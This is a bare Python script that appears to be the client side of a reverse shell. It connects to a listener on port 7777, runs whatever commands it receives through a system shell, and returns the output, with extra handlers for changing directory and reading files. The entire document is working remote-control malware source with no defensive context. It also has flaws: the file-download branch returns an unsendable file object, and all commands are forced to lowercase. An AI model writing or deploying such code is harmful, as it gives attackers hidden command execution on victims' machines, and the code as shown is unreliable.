import socket as st
from subprocess import Popen, PIPE
import os
from colorama import Fore, Style

def execute_command(cmd):
    try:
        if cmd.startswith('cd '):  
            _dir = cmd.split(maxsplit=1)[1]  
            os.chdir(_dir)  
            return b"Directory changed successfully\n"
        
        if cmd.startswith('download '):
            dfile = cmd.split()[1]
            if os.path.isfile(dfile):
                with open(dfile,'r',encoding='utf-8') as file:
                    return file
            else:
                return b'file doesnt exist\n'

        if cmd in ('pwd', 'cwd'):
            return os.getcwd().encode() + b"\n"

        proc = Popen(cmd, stdout=PIPE, stderr=PIPE, shell=True)
        getout, geterr = proc.communicate()

        return getout if getout else geterr or b"\n"  

    except Exception as err:
        return f"Error: {err}".encode()  

def main():
    sock = st.socket(st.AF_INET, st.SOCK_STREAM)
    sock.connect(('127.0.0.1', 7777))

    while True:
        get_cmd = sock.recv(1024).decode().strip().lower()
        if not get_cmd:  
            print("Connection closed by server.")
            break 

        result = execute_command(get_cmd)
        sock.sendall(result) 

    sock.close() 

if __name__ == "__main__":
    main()
